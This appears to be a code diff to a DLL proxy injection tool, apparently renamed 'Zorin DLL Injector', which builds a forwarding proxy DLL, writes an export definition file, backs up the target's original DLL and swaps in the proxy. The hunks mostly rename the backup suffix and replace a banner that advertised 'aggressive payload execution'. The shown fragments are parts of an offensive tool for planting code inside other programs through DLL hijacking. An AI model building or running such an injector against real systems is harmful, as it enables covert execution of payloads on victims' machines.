@@ -145,7 +145,7 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {{
             strcpy_s(original_path, MAX_PATH, dll_path);
             char* last_dot = strrchr(original_path, '.');
             if (last_dot) {{
-                strcpy_s(last_dot, MAX_PATH - (last_dot - original_path), "_original.dll");
+                strcpy_s(last_dot, MAX_PATH - (last_dot - original_path), "_org.dll");
             }}
             
             // Load original DLL
@@ -196,7 +196,7 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {{
         def_content += "EXPORTS\n"
         
         for i, export in enumerate(exports, 1):
-            def_content += f"    {export}={dll_name}_original.{export} @{i}\n"
+            def_content += f"    {export}={dll_name}_org.{export} @{i}\n"
         
         def_path = self.payload_path.with_name('exports.def')
         with open(def_path, 'w') as f:
@@ -235,11 +235,10 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {{
     def inject(self):
         """Perform injection"""
         try:
-            print("\n[*] DLL Proxy Injection Method v4.0")
-            print("[*] Enhanced with aggressive payload execution\n")
+            print("\n[*] Zorin DLL Injector v0.2 \n")
             
             original_backup = self.dll_path.with_name(
-                f"{self.dll_path.stem}_original{self.dll_path.suffix}")
+                f"{self.dll_path.stem}_org{self.dll_path.suffix}")
             temp_dll = self.dll_path.with_name(
                 f"{self.dll_path.stem}_temp{self.dll_path.suffix}")
             
